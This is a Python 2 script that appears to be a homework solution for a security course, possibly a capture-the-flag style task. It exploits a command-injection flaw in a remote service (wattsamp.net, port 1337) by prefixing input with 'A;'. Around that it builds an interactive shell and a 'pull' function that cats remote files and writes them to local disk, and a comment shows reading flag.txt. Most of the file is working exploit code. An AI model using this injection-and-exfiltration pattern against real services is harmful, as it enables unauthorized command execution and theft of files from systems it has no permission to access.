"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import os 
import sys
import time


host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/3/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

    """

   
    s.send("A;"+cmd+"\n")
    time.sleep(0.1)                    
    dataTwo = s.recv(1024)
    #time.sleep(0.1)
    #print(dataTwo)
    
    
    print(dataTwo)
    s.close()

if __name__ == '__main__':
    while True:
        sys.stdout.write(">")
        cmd = raw_input()
        cmd = cmd.lower()
        cmd = cmd.split()
        if cmd[0] == 'exit':
            break
        elif cmd[0] == 'shell':
            while True:
                sys.stdout.write("/>")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                data = s.recv(1024)
                time.sleep(0.1)

                cmdOne = raw_input()
                cmdOne = cmdOne.lower()
                cmdOne = cmdOne.split()
                if cmdOne == []:
                    continue

                elif cmdOne[0] == "ls":
                    
                    execute_cmd("ls")
                    
                elif cmdOne[0] == "cd":
                    #s.close()
                    while True:
                        #execute_cmd("home")
                        sys.stdout.write(cmdOne[1]+">")
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        dataInnShell = s.recv(1024)
                        time.sleep(0.1)
                        getCdCom = raw_input()
                        getCdCom = getCdCom.lower()
                        getCdCom = getCdCom.split()
                        
                        #s.send("A;"+cmdOne[1]+"\n")
                        #A; cd home && cat flag.txt
                        
                        if getCdCom[0] == "cat":
                            #print(getCdCom[1])
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((host, port))
                            dataInnShellCat = s.recv(1024)
                            time.sleep(0.1)
                            execute_cmd("cd"+" "+cmdOne[1]+"&&"+" "+"cat"+" "+ getCdCom[1])
                            
                        elif getCdCom[0] == "ls": 
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((host, port))
                            dataInShellCat = s.recv(1024)
                            time.sleep(0.1)
                            execute_cmd("cd"+" "+cmdOne[1]+"&&"+" "+"ls")
                        elif getCdCom[0] =="pwd":
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((host, port))
                            dataInPwdShellCat = s.recv(1024)
                            time.sleep(0.1)
                            execute_cmd("cd"+" "+cmdOne[1]+"&&"+" "+"pwd")
                            #execute_cmd(getCdCom[0])
                        elif getCdCom[0] == "exit":
                            break
                        else:
                            print("command not supported")


                elif cmdOne[0] == "exit":
                    break
                elif cmdOne[0] == "quit":
                    break
                elif cmdOne[0] == "pwd":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    dataInPwd = s.recv(1024)
                    time.sleep(0.1)
                    execute_cmd("pwd")
                else:
                    break
        
        elif cmd[0] == 'help':
            print("Shell --- Drop into an interactive shell"+"\n")
            print("pull  --- to download files" +"\n")
            print("quit  --- to quit the shell gracefully" +"\n")
            print("help  --- shows this help menu"+"\n")
        
        elif cmd[0] == 'quit':
            break
        elif cmd[0] == 'pull':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            dataInShellCatPull = s.recv(1024)
            time.sleep(0.1)
            #execute_cmd("cat" + cmd[1] )
            s.send("A;cat"+" "+cmd[1]+"\n")
            time.sleep(0.1)                    
            dataThree = s.recv(3000)
            time.sleep(0.1)
            f = open(cmd[2], "w")
            f.write(dataThree)
            f.close()
            s.close()
            #print(dataThree)




        else:
            print("Shell --- Drop into an interactive shell"+"\n")
            print("pull  --- to download files" +"\n")
            print("quit  --- to quit the shell gracefully" +"\n")
            print("help  --- shows this help menu"+"\n")
            
    #s.close()
       
    



   